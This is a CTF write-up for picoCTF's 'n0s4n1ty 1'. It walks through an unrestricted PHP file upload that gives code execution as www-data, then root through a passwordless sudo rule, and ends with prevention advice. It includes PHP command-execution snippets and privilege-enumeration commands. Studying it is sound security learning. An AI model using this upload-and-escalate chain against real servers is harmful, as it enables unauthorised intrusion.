# n0s4n1ty 1 — Full CTF Write-Up

| Field | Details |
| :--- | :--- |
| **Platform** | picoCTF |
| **Category** | Web Exploitation |
| **Difficulty** | Easy |
| **Focus** | Unrestricted File Upload → Remote Code Execution → Privilege Escalation |

---

## Challenge

The challenge provides a web application with a profile-picture upload feature.

The description hints that the upload functionality is flawed and that the final flag is located somewhere under:
```text
/root
```

The goal was not just to obtain the flag, but to understand the complete exploitation chain and why the vulnerabilities existed.

### Category Focus
This challenge combines:
- File upload vulnerabilities
- Server-side code execution
- Linux privilege enumeration
- `sudo` misconfiguration
- Privilege escalation

---

## Vulnerability

The challenge contains two major security weaknesses:

### 1. Unrestricted File Upload
The application allows users to upload files without properly validating whether they are actually images.

More importantly, it allows PHP files to be uploaded into a web-accessible directory:
```text
/uploads/
```

Because PHP files in this directory are interpreted by the web server, uploading a malicious PHP file results in **Remote Code Execution (RCE)**.

### 2. Dangerous sudo Configuration
The web-service account `www-data` was configured with:
```text
(ALL) NOPASSWD: ALL
```

This means `www-data` could execute any command as any user, including root, without entering a password.

Therefore, the two vulnerabilities combine into:
```text
Unrestricted File Upload
        ↓
PHP Code Execution
        ↓
RCE as www-data
        ↓
Misconfigured sudo
        ↓
Root privileges
```

---

## Initial Clue

The challenge description mentioned a profile picture upload and indicated that the implementation was flawed.

This immediately suggested investigating the upload functionality.

The key questions were:
- What endpoint handles the upload?
- What parameter contains the uploaded file?
- Does the server validate the file type?
- Where is the uploaded file stored?
- Can the uploaded file be accessed directly?
- Does the server execute uploaded PHP files?
- What privileges does the resulting code execution have?

This established a systematic enumeration path instead of blindly throwing payloads.

---

## Enumeration

### 1. Identify the Upload Endpoint

Using the browser and Developer Tools, we inspected the upload request.

The request was:
```http
POST /upload.php
```

and used:
```http
Content-Type: multipart/form-data
```

The uploaded file was sent through the parameter:
```text
fileToUpload
```

The application stored uploaded files under:
```text
uploads/
```

Conceptually, the HTTP request looked like:
```http
POST /upload.php

fileToUpload=<uploaded file>
submit=Upload File
```

### 2. Test File Validation

Rather than assuming the application only accepted images, we tested different file extensions:

```text
test.jpg  → accepted
test.txt  → accepted
test.php  → accepted
```

This was our first major finding: the application did not properly restrict uploads to image files, indicating an unrestricted file-upload vulnerability.

---

## Exploitation — Part 1

### 3. Test PHP Execution

We created a harmless PHP file (`test.php`):
```php
<?php echo "PHP_EXEC_TEST"; ?>
```

After uploading it, the application reported that the file was stored in:
```text
uploads/test.php
```

We accessed the uploaded file through the browser at `/uploads/test.php`. The page displayed:
```text
PHP_EXEC_TEST
```

This confirmed that the server was executing uploaded PHP code.

```text
Arbitrary File Upload
        ↓
PHP Upload
        ↓
PHP Execution
        ↓
Remote Code Execution
```

### 4. Identify the Execution User

Once PHP execution was confirmed, we executed:
```php
<?php
system("whoami");
?>
```

The result was:
```text
www-data
```

We then executed:
```php
<?php
system("id");
?>
```

which returned:
```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

This told us that our code was executing as the Apache web-service account:
```text
www-data
```

> [!NOTE]
> **RCE does not automatically mean root access.**
> At this stage, we had code execution confined to the unprivileged service account:
> `Attacker → PHP RCE → www-data`

### 5. Enumerate the Environment

We checked the current working directory:
```text
/var/www/html/uploads
```

and examined the web root:
```text
/var/www/html
├── index.php
├── upload.php
└── uploads/
```

The upload directory was located inside the web root (`/var/www/html/uploads`). This was critical because files placed there could be requested and executed directly through the web server.

### 6. Inspect the Application Source Code

Since `www-data` had read access to the application files, we inspected `/var/www/html/upload.php`.

The relevant code was:
```php
$target_dir = "uploads/";
$target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);
$uploadOk = 1;
```

The application moved the uploaded file directly:
```php
move_uploaded_file(
    $_FILES["fileToUpload"]["tmp_name"],
    $target_file
);
```

There was no server-side check restricting the upload to legitimate image files. The source even contained the comment:
```php
// Removed the MIME type check to allow PHP files
```

This explained exactly why our `.php` file was accepted.

### 7. Inspect the Client-Side Code

We also examined `index.php`. The client-side JavaScript contained:
```javascript
var file = input.files[0];
var type = file.type;
```

However, the MIME type was only obtained for the browser-side image preview:
```javascript
output.src = URL.createObjectURL(event.target.files[0]);
```

It was not used to enforce any security restriction.

> [!IMPORTANT]
> **Client-side validation is not a security boundary.**
> An attacker can bypass JavaScript completely by sending the HTTP request directly using tools such as Burp Suite or `curl`. Security validation must always happen on the server.

---

## Exploitation — Part 2

### 8. Check Access to /root

The challenge stated that the flag was located under `/root`.

We tested:
```bash
ls -la /root
```
as `www-data`.

The result was:
```text
Permission denied
```

This confirmed that `www-data` could not directly access the root user's directory. We therefore needed to investigate privilege escalation vectors.

### 9. Enumerate sudo Permissions

We checked:
```bash
sudo -l
```

The output was:
```text
User www-data may run the following commands on challenge:
    (ALL) NOPASSWD: ALL
```

This was the critical privilege-escalation finding:
- **`(ALL)`** — `www-data` can run commands as any user.
- **`NOPASSWD`** — No password is required.
- **`ALL`** — There is no restriction on which commands can be executed.

```text
www-data
    ↓
sudo
    ↓
any command
    ↓
any user
    ↓
root
```

### 10. Confirm Privilege Escalation

Before accessing sensitive data, we verified the escalated privilege level:
```bash
sudo whoami
```

The result was:
```text
root
```

This confirmed that the web-service account could execute arbitrary commands with full root privileges.

**Complete exploitation chain:**
```text
Profile Picture Upload
        ↓
Arbitrary File Upload
        ↓
Upload .php
        ↓
PHP executes
        ↓
RCE as www-data
        ↓
sudo -l
        ↓
NOPASSWD: ALL
        ↓
Root privileges
```

### 11. Locate the Flag

Now that root access was confirmed, we enumerated `/root`:
```bash
sudo ls -la /root
```

The directory contained:
```text
flag.txt
```

We read the flag file:
```bash
sudo cat /root/flag.txt
```

The flag was successfully retrieved.

---

## Tools

### Browser / Developer Tools
Used to:
- Inspect the upload form
- Identify the upload endpoint
- Inspect HTTP requests
- Identify the `fileToUpload` parameter
- Observe upload responses

### PHP
Used to create harmless test files and demonstrate server-side code execution.

### Linux Commands
```bash
whoami
id
pwd
ls -la
sudo -l
find
getcap
```
Used for:
- Identity enumeration
- Permission enumeration
- Filesystem enumeration
- Privilege escalation discovery

### Apache + PHP Stack
Understanding the server stack was critical because the uploaded `.php` file was interpreted by PHP rather than treated as an ordinary static file.

---

## What I Learned

### 1. Never assume an upload is restricted
A feature labeled "profile picture upload" does not imply the server enforces image-only uploads. Always test multiple extensions:
```text
.jpg
.png
.txt
.php
```
and determine what the server actually accepts.

### 2. File upload and code execution are different concepts
Uploading a PHP file alone does not guarantee RCE. The complete chain requires:
```text
Upload PHP
     ↓
File accessible
     ↓
Server interprets PHP
     ↓
Code executes
```
If the server stores uploaded files in a non-executable location or serves them as plain text, the upload may not result in code execution.

### 3. Client-side validation isn't security
JavaScript can improve user experience, but it cannot protect the server. An attacker can bypass the browser completely:
```text
Client-side validation ≠ Security validation
```

### 4. RCE doesn't necessarily mean root
Our initial RCE was as `www-data`, not `root`. We had to enumerate the system and discover the privilege-escalation opportunity.

This demonstrates the difference between:
- **Initial Access** — PHP upload → `www-data`
- **Privilege Escalation** — `www-data` → `root`

### 5. `sudo -l` is a vital enumeration command
After obtaining access to a Linux system, running:
```bash
sudo -l
```
reveals commands the current user is allowed to execute with elevated privileges. In this challenge, it immediately exposed `(ALL) NOPASSWD: ALL`.

---

## Why the Vulnerability Existed

1. **Lack of Server-Side File Validation:**
   The application accepted arbitrary user-supplied filenames and moved them directly into `uploads/` without verifying file types or extensions:
   ```text
   Receive file → User-controlled filename → Place into uploads/ → Web server executes PHP
   ```

2. **Web-Accessible Execution Directory:**
   The upload directory was located inside the web root (`/var/www/html/uploads`), and PHP execution was permitted within it.

3. **Insecure Sudo Misconfiguration:**
   The system administrator granted the web-service account unrestricted passwordless `sudo` privileges:
   ```text
   www-data → (ALL) NOPASSWD: ALL
   ```
   This violated the principle of least privilege and allowed trivial root escalation.

---

## How to Prevent It

### 1. Use a Server-Side Allowlist
Only allow known-safe file types:
```text
.jpg
.jpeg
.png
```
Never rely solely on user-supplied file extensions or MIME headers.

### 2. Validate the Actual File Contents
Use server-side image processing and signature/magic byte verification rather than trusting `filename` or `Content-Type` from the client.

### 3. Store Uploads Outside the Web Root
Instead of:
```text
/var/www/html/uploads/
```
store files outside the web root:
```text
/var/uploads/
```
Serve images through controlled application routing logic.

### 4. Disable Script Execution in Upload Directories
Even if an attacker manages to upload a `.php` file, the upload directory should disable PHP script execution via server configuration (e.g. Apache `php_admin_flag engine off` or Nginx location block).

### 5. Generate Server-Side Filenames
Never use the raw user-supplied name:
```php
$_FILES["fileToUpload"]["name"]
```
Generate a random hash/UUID server-side instead:
```text
user-uploaded-name.php → 8f31c2a91b4e.jpg
```

### 6. Enforce File-Size Limits
Restrict upload sizes to prevent disk exhaustion and denial-of-service conditions.

### 7. Never Give `www-data` Unrestricted Sudo
A web service account should have minimal privileges. Never configure:
```text
www-data ALL=(ALL) NOPASSWD: ALL
```
If elevated functionality is required, restrict it strictly to specific commands and validate all arguments.

---

## Final Attack Chain

```text
                    n0s4n1ty 1
                         │
                         ▼
               Profile Picture Upload
                         │
                         ▼
                    /upload.php
                         │
                         ▼
              fileToUpload parameter
                         │
                         ▼
               No proper file validation
                         │
                         ▼
                   Upload .php
                         │
                         ▼
               /uploads/test.php
                         │
                         ▼
                 PHP Code Execution
                         │
                         ▼
                     www-data
                         │
                         ▼
                     sudo -l
                         │
                         ▼
               (ALL) NOPASSWD: ALL
                         │
                         ▼
                        root
                         │
                         ▼
                   /root/flag.txt
                         │
                         ▼
                       FLAG
```

---

## Key Takeaway

The biggest lesson from `n0s4n1ty 1` is the methodology:

```text
Enumerate
   ↓
Understand the application
   ↓
Test assumptions
   ↓
Identify the vulnerability
   ↓
Confirm code execution
   ↓
Enumerate privileges
   ↓
Escalate
   ↓
Access the objective
```

A seemingly harmless profile-picture upload becomes a complete system compromise when file validation, upload storage, PHP execution, and Linux privileges are all improperly configured.